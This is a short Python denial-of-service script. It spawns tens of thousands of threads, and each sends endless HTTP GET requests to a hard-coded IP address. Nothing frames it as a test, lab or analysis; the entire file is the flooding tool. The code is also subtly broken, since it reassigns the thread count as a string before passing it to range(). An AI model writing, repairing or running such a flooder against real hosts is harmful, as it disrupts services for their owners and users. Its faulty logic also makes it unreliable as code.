import colorama
import threading
import requests
from colorama import init
init()

def dos(target):
    while True:
        try:
            res = requests.get(target)
            res = requests.get(target)
            res = requests.get(target)
            res = requests.get(target)
        except requests.exceptions.ConnectionError:
            print(colorama.Fore.LIGHTGREEN_EX + "Connection error!")

threads = 50000

url = "http://85.10.195.175"
try:
    threads = "20000"
except ValueError:
    exit("Threads count is incorrect!")
if threads == 0:
    exit("Threads count is incorrect!")
if not url.__contains__("http"):
    exit("URL doesnt contains http or https!")
if not url.__contains__("."):
    exit("Invalid domain")
for i in range(0, threads):
    thr = threading.Thread(target=dos, args=(url,))
    thr.start()
    print(str(i + 1) + " thread started!")

